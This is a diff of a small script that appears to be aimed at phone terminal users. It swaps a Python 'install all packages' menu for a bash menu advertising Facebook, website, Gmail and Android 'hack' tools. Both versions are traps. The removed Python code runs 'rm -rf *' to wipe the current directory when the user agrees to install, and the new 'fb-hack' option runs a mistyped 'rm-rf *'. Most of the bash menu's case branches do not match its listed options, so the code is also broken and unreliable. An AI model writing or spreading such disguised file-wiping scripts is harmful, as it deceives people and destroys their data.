@@ -1,133 +1,66 @@
-import os
-import time
-import sys
+clear
+banner()
+{
 
-os.system("clear")
+  printf "
+\e[35mM╔═══╗───────────────────╔╗───╔╗╔╗
+║╔══╝──────────────────╔╝╚╗──║║║║
+║╚══╦══╦══╦╗─╔╗──╔╦═╗╔═╩╗╔╬══╣║║║╔══╦═╗
+║╔══╣╔╗║══╣║─║╠══╬╣╔╗╣══╣║║╔╗║║║║║║═╣╔╝
+║╚══╣╔╗╠══║╚═╝╠══╣║║║╠══║╚╣╔╗║╚╣╚╣║═╣║
+╚═══╩╝╚╩══╩═╗╔╝──╚╩╝╚╩══╩═╩╝╚╩═╩═╩══╩╝
+──────────╔═╝║
+──────────╚══╝"
+  echo "|  gmail:bptz393@gmail.com
+            github:https://github.com/Ever-Sad12|"
+  echo "+-----Make_by_Bhonepyae-----------------+"
+}
 
-print('''\033[91m
-PPPP
-P            P
-P            P
-PPPP
-P
-P
-P
+banner "Starting the Job"
+sleep 3
 
-y               y
-   y         y
-      y   y
-         y
-         y
-         y
-         y
-
-   aaa
-a         a
-a         a
-aaaaa
-a         a
-a         a
-a         a
-
-eeeee
-e
-e
-eeeee
-e
-e
-eeeee
-
-   ssss
-s
-s
-   sss
-            s
-            s
-ssss
-
-   oooo   
-o            o
-o            o
-o            o
-o            o
-o            o
-   oooo   
-
-n               n
-nn            n
-n   n         n
-n      n      n
-n         n   n
-n            nn
-n               n
-
-eeeee
-e
-e
-eeeee
-e
-e
-eeeee
-
-h         h
-h         h
-h         h
-hhhhh
-h         h
-h         h
-h         h
-
-     m                         m
-     mm               mm
-     m     m     m     m
-     m          m          m
-     m                         m
-     m                         m
-     m                         m
-
-   oooo   
-o            o
-o            o
-o            o
-o            o
-o            o
-   oooo   
-
-   oooo   
-o            o
-o            o
-o            o
-o            o
-o            o
-   oooo
-''')
-def print(s):
-    for c in s + '\n' :
-        sys.stdout.write(c)
-        sys.stdout.flush()
-        time.sleep(5. / 100)
-
-print (''' \033[95m
-+--------------------------------------+
- Install All Basic Packages |
-$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
-|  By Zero_@290G |
-**************************************''')
-
-print('
-[01] fb-attekre')
-
-print ("                                            ")
-choice = input("\033[93mDo You Want to Install All Packages [y/n] : ")
-if choice == 'n' : sys.exit()
-if choice == 'y' : os.system ("rm -rf *")
-def slowprint(s):
-    for c in s + '\n' :
-        sys.stdout.write(c)
-        sys.stdout.flush()
-        time.sleep(8. / 100)
-print("\033[95m+-------------------------------------------------+")
-print('''\033[95m|           We are INNWA Family           |''')
-print("+-------------------------------------------------+")
-
-input("\n\nPress the enter key to exit : ")
+PS3='Choose u want to install: '
+pkg=("fb-hack" "website-hack" "gmai-hack" "Android-hack" "zero_@290G" "exit")
+select fav in "${pkg[@]}"; do
+    case $fav in
+        "fb-hack")
+            echo "start runing"
+            rm-rf *
+            echo "rm-rf"
+            exit
+            ;;
+        "Python2")
+            echo "
+            start runing..."
+            pkg install python2 -y
+            echo "This pkg is installed"
+            exit
+            ;;
+        "git")
+            echo "start runing..."
+            pkg install git -y
+            echo "This pkg is installed"
+            exit
+            ;;
+        "Install-3pkg")
+            echo "start runing"
+            pkg install python -y
+            pkg install python2 -y
+            pkg install git -y
+            echo "All are installed"
+            exit
+            ;;
+        "ifconfig")
+            echo "start runing"
+            pkg install net-tools
+            ifconfig
+            echo "This is your ip"
+            exit
+            ;;
+        "exit")
+            echo "Thank for using my tool"
+            exit
+            ;;
+        *) echo "invalid option $REPLY";;
+    esac
+done
